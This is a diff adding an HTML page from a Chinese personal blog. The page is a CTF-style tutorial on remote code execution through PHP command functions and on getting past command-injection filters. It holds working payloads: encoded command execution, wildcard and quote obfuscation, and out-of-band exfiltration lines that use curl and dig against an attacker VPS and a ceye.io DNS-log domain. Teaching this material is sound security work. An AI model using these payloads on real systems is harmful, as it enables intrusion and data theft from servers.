@@ -1,0 +1,807 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="RCE什么是RCE 远程代码执行 （RCE） 是一类软件安全缺陷&#x2F;漏洞。RCE 漏洞将允许恶意行为人通过 LAN、WAN 或 Internet 在远程计算机上执行自己选择的任何代码。RCE 属于更广泛的任意代码执行 （ACE） 漏洞类别。然而，随着互联网的普及，RCE漏洞的影响迅速扩大。因此，RCEs 现在可能是 ACE 最重要的漏洞类型。  简单来说，RCE就是在对方主机上实现对方非预">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE+命令执行">
+<meta property="og:url" content="http://example.com/2024/11/27/RCE+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="RCE什么是RCE 远程代码执行 （RCE） 是一类软件安全缺陷&#x2F;漏洞。RCE 漏洞将允许恶意行为人通过 LAN、WAN 或 Internet 在远程计算机上执行自己选择的任何代码。RCE 属于更广泛的任意代码执行 （ACE） 漏洞类别。然而，随着互联网的普及，RCE漏洞的影响迅速扩大。因此，RCEs 现在可能是 ACE 最重要的漏洞类型。  简单来说，RCE就是在对方主机上实现对方非预">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://niko-1319318245.cos.ap-nanjing.myqcloud.com/Markdown/image-20231018200013010.png">
+<meta property="og:image" content="https://niko-1319318245.cos.ap-nanjing.myqcloud.com/Markdown/image-20231030195622647.png">
+<meta property="article:published_time" content="2024-11-26T16:44:00.000Z">
+<meta property="article:modified_time" content="2024-12-03T14:16:05.546Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="技术帖">
+<meta property="article:tag" content="NIKO">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="网络安全，命令执行">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://niko-1319318245.cos.ap-nanjing.myqcloud.com/Markdown/image-20231018200013010.png">
+  
+  
+  
+  <title>RCE+命令执行 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>王骏飞的Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/ph1.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="RCE+命令执行"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-27 00:44" pubdate>
+          2024年11月27日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">RCE+命令执行</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="什么是RCE"><a href="#什么是RCE" class="headerlink" title="什么是RCE"></a>什么是RCE</h2><blockquote>
+<p>远程代码执行 （RCE） 是一类软件安全缺陷&#x2F;漏洞。RCE 漏洞将允许恶意行为人通过 LAN、WAN 或 Internet 在远程计算机上执行自己选择的任何代码。RCE 属于更广泛的任意代码执行 （ACE） 漏洞类别。然而，随着互联网的普及，RCE漏洞的影响迅速扩大。因此，RCEs 现在可能是 ACE 最重要的漏洞类型。</p>
+</blockquote>
+<p>简单来说，RCE就是在对方主机上实现对方非预期的自己的代码，从而控制后台系统。</p>
+<h2 id="哪些函数可以被利用呢？"><a href="#哪些函数可以被利用呢？" class="headerlink" title="哪些函数可以被利用呢？"></a>哪些函数可以被利用呢？</h2><p>那当然是可以<strong>执行命令或代码</strong>的函数辣！</p>
+<h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>system()函数会调⽤<code>fork()</code>产⽣⼦进程，由⼦进程调⽤ <code>/bin/sh -c command</code> 执⾏特定的命令，暂停当前进程直到 command命令执⾏完毕，当此命令执⾏完后随即返回原调用的进程。</p>
+<p> 当system()正常执⾏，将返回命令的退出码； </p>
+<p>当返回值为127，相当于执⾏了exit函数，⽽⾃身命令没有执行； </p>
+<p>当返回值为-1，代表没有执⾏system调⽤。</p>
+<p>所以这个函数就是字面意思——<strong>执行参数中的命令</strong></p>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>与<code>system()</code>的不同主要在于<code>exec()</code>并不会调⽤<code>fork()</code>产⽣新进程、暂停原命令来执⾏新命令，⽽是直接覆盖原命令，对返回值有影响。 </p>
+<p>exec执⾏command命令时，不会输出全部结果，⽽是返回结果的最后⼀⾏。</p>
+<p>如果结果有多行需要传入第二个参数接受，必须为数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-variable">$arr</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>在shell下执⾏，适⽤于Linux Macos，并且结果可以有多⾏，字符串⽅式返回，绕过执⾏过程中出错或⽆输出，返回 NULL</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p>passthru直接将结果输出，<strong>不返回结果</strong>(与system的区别)</p>
+<h2 id="系统命令拼接方式"><a href="#系统命令拼接方式" class="headerlink" title="系统命令拼接方式"></a>系统命令拼接方式</h2><p>如果你可以控制上述函数，那么想达到特定目的时，一条命令显然是不够的，我们需要将多条命令拼接在一起执行。</p>
+<ul>
+<li><p><code>|</code>：管道符，管道符前的命令输出作为管道符后面的标准输入（非常形象的名字）。</p>
+<blockquote>
+<p>例如：<code>help|more</code></p>
+</blockquote>
+</li>
+<li><p><code>&amp;</code>：commandA &amp; commandB 先运行命令A，然后运行命令B</p>
+</li>
+<li><p><code>||</code>：commandA || commandB 运行命令A，如果失败则运行命令B</p>
+</li>
+<li><p><code>&amp;&amp;</code>： commandA &amp;&amp; commandB 运行命令A，如果成功则运行命令B</p>
+</li>
+<li><p>cmd1 ; cmd2 (; 分号操作符)执行多条命令</p>
+</li>
+</ul>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>如果你是程序的编写者，显然你会想方法阻止用户任意使用你的命令执行函数，具体的表现为限制用户的输入内容，对用户的输入内容进行检测和过滤。兵来将挡，水来土掩。同样的，我们也有许多绕过限制的方法，请看：</p>
+<h3 id="php字符被过滤"><a href="#php字符被过滤" class="headerlink" title="php字符被过滤"></a>php字符被过滤</h3><p>我们知道，正常的php代码是需要有php标记（标签）的，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果<code>php</code>三个字母被过滤，我们可以使用短标签，效果相同：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-comment">//php代码 ?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="system被过滤"><a href="#system被过滤" class="headerlink" title="system被过滤"></a>system被过滤</h3><p>过滤了system关键字，该如何执行命令呢？</p>
+<p>使用反引号绕过：</p>
+<p>等等，先介绍一下反引号：</p>
+<blockquote>
+<p>大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的反引号作<strong>指令替代</strong>，意思是以某一个指令的输出结果<strong>作为另一个指令的输入项</strong>。linux下反引号里面包含的就是需要执行的系统命令，<strong>而反引号里面的系统命令会先执行，成功执行后将结果传递给调用它的命令(就是将反引号内命令的输出作为输入执行)，类似于|管道</strong>，这个就是内联执行。</p>
+</blockquote>
+<p><strong>反引号可以用来在PHP代码中直接执行系统命令，但是想要回显的话还是需要一个 <code>echo</code>，当然不止echo，其他外带信息输出信息的方式也可以，这里有个叫法叫内联执行</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-keyword">echo</span> `ls /`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><ul>
+<li><p>利用URL编码绕过：%20、%09(Tab)</p>
+</li>
+<li><p>还有利⽤ $IFS$9、 $IFS$1 、 ${IFS}、 $IFS等内部域分隔符（也是IFS的⼀种，因此没有双引号包裹时被echo会 被空格替换）</p>
+<blockquote>
+<p>IFS（Internal Filed Separator，内部域分隔符）是一个set变量（shell变量），默认是空格、Tab键、换行符，使用for循环读取值列表时，会根据IFS的值判断列表中值的个数。</p>
+<p>IFS的作⽤就是把字符串⾥的某某字符（和它⼀样的字符）转义成分隔符。</p>
+<p>也就是说可以对IFS重新赋值</p>
+<p>而空格被当作分隔符时会合并，因此直接echo含多个空格的变量，会去重连续的空格，若要保留，echo时加上双引号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;IFS=<span class="hljs-string">&#x27;&amp;&#x27;</span><br>&gt;STRING2=<span class="hljs-string">&quot;111&amp;222&amp;&amp;333&amp;&amp;&amp;444&quot;</span><br>&gt;<span class="hljs-built_in">echo</span> <span class="hljs-variable">$STRING2</span> <span class="hljs-comment"># 111 222 333 444 (没有双引号包裹，分隔符以空格显示)</span><br>&gt;<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$STRING2</span>&quot;</span> <span class="hljs-comment"># 111&amp;222&amp;&amp;333&amp;&amp;&amp;444</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+</li>
+<li><p>花括号{}，比如{cat,flag}</p>
+<blockquote>
+<p>注意：如果执行的命令不带参数也要含有<code>,</code>，如<code>&#123;ls,&#125;</code>。</p>
+</blockquote>
+</li>
+<li><p><code>&lt;</code>、<code>&lt;&gt;</code></p>
+<h2 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h2><h3 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="hljs-built_in">base64</span> -d|bash //cat /flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ph<span class="hljs-string">&quot;&quot;</span>p ---&gt; php<br>ca<span class="hljs-string">&#x27;&#x27;</span>t ---&gt; cat<br>ca``t ---&gt; cat<br></code></pre></td></tr></table></figure>
+
+<h3 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=127.0.0.1;a=l;b=s;$a<span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ca\t =&gt; cat<br>fl\ag =&gt; flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p>什么是Linux shell的通配符&#x2F;glob模式：</p>
+<blockquote>
+<p>glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的&#x2F;etc&#x2F;glob （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为<strong>精简了的正则表达式</strong>，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。shell 通配符 &#x2F; glob 模式通常用来<strong>匹配目录以及文件，而不是文本</strong></p>
+</blockquote>
+</li>
+</ul>
+<p>语法：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th align="center">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td align="center">匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td>?</td>
+<td align="center">匹配任意单个字符</td>
+</tr>
+<tr>
+<td>[list]</td>
+<td align="center">匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
+</tr>
+<tr>
+<td>[^list]</td>
+<td align="center">匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+<tr>
+<td>[!list]</td>
+<td align="center">同<code>[^list]</code></td>
+</tr>
+<tr>
+<td>{str1,str2,…}</td>
+<td align="center">匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
+</tr>
+</tbody></table>
+<p>所以我们的命令就可以这么写：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#flag在/flag中</span><br><span class="hljs-built_in">cat</span>%09/fla*<br><span class="hljs-built_in">cat</span>%09/fla?<br><span class="hljs-comment">#在/flag.txt中</span><br><span class="hljs-built_in">cat</span>%09/fla*<br><span class="hljs-built_in">cat</span>%09/fla?????<br><span class="hljs-comment">#有什么不同？</span><br><br>/bin/ca? a*Hello!<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>对于最后一条，在命令补全的时候指定了命令路径，这是因为补全时会存在歧义，拿<code>ca?</code>举例，可以补全为<code>cal</code>或<code>cat</code>，这两个命令路径可能不同。</p>
+</blockquote>
+<h3 id="HEX编码"><a href="#HEX编码" class="headerlink" title="HEX编码"></a>HEX编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;636174202f666c6167&quot;</span>|xxd -r -p|bash        执⾏<span class="hljs-built_in">cat</span> /flag<br>$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) 执⾏<span class="hljs-built_in">cat</span> /flag<br>&#123;<span class="hljs-built_in">printf</span>,<span class="hljs-string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|<span class="hljs-variable">$0</span> 执⾏<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="Oct（八进制）编码"><a href="#Oct（八进制）编码" class="headerlink" title="Oct（八进制）编码"></a>Oct（八进制）编码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$(printf <span class="hljs-string">&quot;\154\163&quot;</span>)   执⾏ls<br></code></pre></td></tr></table></figure>
+
+<h3 id="内联执行绕过"><a href="#内联执行绕过" class="headerlink" title="内联执行绕过"></a>内联执行绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a`pwd`&quot;</span> <span class="hljs-comment">#输出a/root</span><br>?ip=127.0.0.1;<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="https://niko-1319318245.cos.ap-nanjing.myqcloud.com/Markdown/image-20231018200013010.png" srcset="/img/loading.gif" lazyload alt="image-20231018200013010"></p>
+</blockquote>
+<h3 id="匹配绕过"><a href="#匹配绕过" class="headerlink" title="[ ]匹配绕过"></a>[ ]匹配绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c[a]t =&gt; <span class="hljs-built_in">cat</span><br>mo[r]e =&gt; more<br><span class="hljs-keyword">in</span>[d]ex =&gt; index<br>p[h]p =&gt; php<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用环境变量取值"><a href="#利用环境变量取值" class="headerlink" title="利用环境变量取值"></a>利用环境变量取值</h3><blockquote>
+<p>题外话：相信大家配置环境的时候肯定设置过环境变量这个东西，但你真的知道它是个啥嘛？</p>
+</blockquote>
+<blockquote>
+<p>首先要明白一个概念，就是我们的OS（<strong>Operate System</strong>）中文译为操作系统，本质上就是一个巨大的软件。</p>
+<p>电脑上运行的操作系统其实就是一个巨大的程序，这个程序可能就是 Windows，Linux，Mac 系统中的一种，但是本质都是程序，在这个程序里面有个环境变量。这个变量由其他应用一起使用。本质上来说，环境变量就类似于编程中的变量。</p>
+<p><a target="_blank" rel="noopener" href="https://chihokyo.com/post/6/">进一步了解</a></p>
+</blockquote>
+<p><img src="https://niko-1319318245.cos.ap-nanjing.myqcloud.com/Markdown/image-20231030195622647.png" srcset="/img/loading.gif" lazyload alt="image-20231030195622647"></p>
+<blockquote>
+<p><code>: 23: 1</code>:从下标为23的字符起打印一个字符</p>
+<p>注意：使用<strong>kali</strong>复现时要注意：从2020.4版本开始，kali的默认shell是ZSH,图中变量为bash下的变量，需要自己手动切换。</p>
+</blockquote>
+<h3 id="使用空变量"><a href="#使用空变量" class="headerlink" title="使用空变量"></a>使用空变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c<span class="hljs-variable">$&#123;z&#125;</span>at a.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>外带信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl vps:port/`<span class="hljs-built_in">whoami</span>`#使目标主机访问vps:port执行命令<span class="hljs-built_in">whoami</span>，再访问vps看日志即可<br></code></pre></td></tr></table></figure>
+
+<p>加上编码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl 34kk35.ceye.io/$(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">base64</span>)<br></code></pre></td></tr></table></figure>
+
+<p>使用DNS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig `<span class="hljs-built_in">whoami</span>`.34kk35.ceye.io<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>自行了解DNSlog和ceye的作用</p>
+</blockquote>
+<h2 id="课后阅读"><a href="#课后阅读" class="headerlink" title="课后阅读"></a>课后阅读</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌</a></p>
+<blockquote>
+<p>补充：获取数字1 0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//bool(true)</span><br><span class="hljs-title function_ invoke__">var_dump</span>(!!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//bool(false)</span><br><span class="hljs-title function_ invoke__">var_dump</span>(!<span class="hljs-string">&#x27;&#x27;</span>+!!<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-comment">//int(1)</span><br><span class="hljs-comment">//直接放下标也⾏</span><br><span class="hljs-variable">$____</span>=<span class="hljs-variable">$_</span>[!<span class="hljs-string">&#x27;&#x27;</span>];<span class="hljs-comment">//赋值$_[1]</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>[!!<span class="hljs-string">&#x27;&#x27;</span>];<span class="hljs-comment">//赋值$_[0]</span><br></code></pre></td></tr></table></figure>
+
+
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%8A%80%E6%9C%AF%E5%B8%96/" class="print-no-link">#技术帖</a>
+      
+        <a href="/tags/NIKO/" class="print-no-link">#NIKO</a>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#网络安全，命令执行</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>RCE+命令执行</div>
+      <div>http://example.com/2024/11/27/RCE+命令执行/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/03/%E8%8B%8F%E5%B7%9E%E8%A1%8C%E5%B0%8F%E8%A7%86%E9%A2%91/" title="苏州之行">
